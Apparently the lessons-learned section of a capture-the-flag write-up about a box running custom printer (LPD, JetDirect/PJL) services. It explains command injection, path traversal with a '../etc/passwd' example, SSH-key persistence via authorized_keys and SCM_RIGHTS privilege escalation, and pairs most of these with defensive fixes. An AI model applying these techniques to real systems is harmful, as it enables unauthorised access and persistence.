- **`subprocess.Popen(f"... {var} ...", shell=True)` is command injection unconditionally.** Any time an f-string's interpolated value reaches a shell, the shell's metacharacters (`;`, `|`, `` ` ``, `$(...)`, `>`, `<`, `&`, newline, single/double quotes) are attacker-controlled. The recurring correct pattern is `subprocess.Popen(["prog", var], shell=False)` — arguments as a list, no shell, no substitution. If the operation genuinely needs shell features, `shlex.quote(var)` normalises the value into a single-quoted safe form. Neither approach is complicated; neither is used by anyone reflexively writing "just a quick log append".
- **RFC 1179's LPD protocol is a byte-oriented state machine that resists off-the-shelf clients.** A stock `lpr` won't drive a custom LPD server whose queue check runs `queue in VALID_QUEUE` (substring, not equality) — but the state machine is simple enough to reimplement in ~40 lines of Python. When the target speaks a "well-known" protocol on a non-standard port with a custom implementation, writing a small purpose-built client is usually faster than persuading a general-purpose tool to bend to the specifics.
- **`os.path.join(root, user_path)` is not a security boundary — it's a syntactic concatenation.** The recurring error in path-sandboxing code is treating `os.path.join` as if it clamped the second argument to be inside the first. It doesn't. `os.path.join('/safe/root', '../etc/passwd')` returns `'/safe/root/../etc/passwd'`, which subsequent `os.path.normpath` happily resolves to `/etc/passwd`. The correct sandbox pattern is `abspath = os.path.abspath(os.path.join(root, user_path))` followed by an explicit prefix check: `if not abspath.startswith(root + os.sep): reject()`. jetdirect.py's `_translate` method skipped the check; every subsequent operation was compromised.
- **HP JetDirect / port 9100 / PJL is a specific class of attack surface with its own tooling.** PRET (Printer Exploitation Toolkit) at `github.com/RUB-NDS/PRET` is the canonical reference implementation for PJL/PostScript exploitation; it automates FSDIRLIST, FSUPLOAD, FSDOWNLOAD, and dozens of vendor-specific commands. Emulators like `jetdirect.py` that reimplement the protocol in Python for internal use recreate the same attack surface with fresh vulnerabilities — implementers copy the interface without copying the deeper hardening that HP added to real firmware over three decades of exposure.
- **The `authorized_keys` write is a universal terminal state for arbitrary-file-write primitives.** Whenever an exploitation path terminates in "write to any file this user can write to", planting a public key in `~/.ssh/authorized_keys` converts the primitive into a persistent, out-of-band, admin-friendly-looking authentication path. SSH itself does strict permission checking on `.ssh/` and `authorized_keys` (`.ssh/` must be 700, `authorized_keys` must be 600 or 644 and owned by the user), but these constraints are automatically satisfied when the write is performed by a process running as that user.
- **`SCM_RIGHTS` is a documented Linux feature for passing file descriptors, and its safe use requires care.** The mechanism exists so a privileged process can hand a specific file descriptor to a less-privileged process for a specific purpose (a network listener socket to a worker, a per-request log file to a request-handler, a temp file to a helper). It becomes a privilege-escalation primitive whenever the sender passes a descriptor the receiver was not supposed to be able to open. Design-level defence: never pass fds that transitively grant broader access than the receiver's baseline; audit `sendmsg` call sites for what specific fds they hand out and to which trust boundary; prefer sending data over the socket rather than the fd that produced the data.
- **Linux permission checks happen at `open()`, not at `read()`.** Once a file is open, the kernel does not re-evaluate the caller's UID against the file's mode bits — the fd is authoritative. This is what makes `SCM_RIGHTS` work at all, and it's the same property that makes long-lived setuid binaries dangerous even after the file they opened has had its permissions tightened. Any auditing of "who can read what" must include not just the current UID/mode state but the set of open file descriptors held across the system's processes and the paths those descriptors were opened against.
- **Log files as attacker-controlled triggers are their own subtle vulnerability class.** The paperwork-daemon read `commands.log` to decide whether to trigger the lockdown path — meaning any process that could write to that log could induce the lockdown behaviour (and its associated fd-passing). The lockdown was itself the sensitive operation, so this was direct privesc; even in less severe cases, an attacker-writable log that a privileged process reads as input becomes a channel for the attacker to influence privileged decisions. When a daemon reads a log to make security decisions, the log's write ACL becomes part of the security perimeter.
